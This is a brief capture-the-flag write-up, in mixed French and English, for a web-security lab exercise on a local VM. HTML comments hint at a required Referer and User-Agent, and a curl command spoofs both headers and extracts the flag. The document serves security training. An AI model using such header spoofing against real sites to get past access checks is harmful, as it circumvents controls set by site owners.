# Exploit 12 - User-agent and Referer headers

sur la page http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f, on peut trouver les commentaires:

```html
<!--
You must come from : "https://www.nsa.gov/".
-->
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

Ils suggèrent d'envoyer une requète au même URL mais armé des headers:

-   `Referer: https://www.nsa.gov/`
-   `User-Agent: ft_bornToSec`

This can be automated with the command:

```bash
curl -s -X GET "http://192.168.56.102/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" -H 'Referer: https://www.nsa.gov/' -H "User-Agent: ft_bornToSec" | grep -oP 'The flag is : \K[0-9a-f]{64}'
```
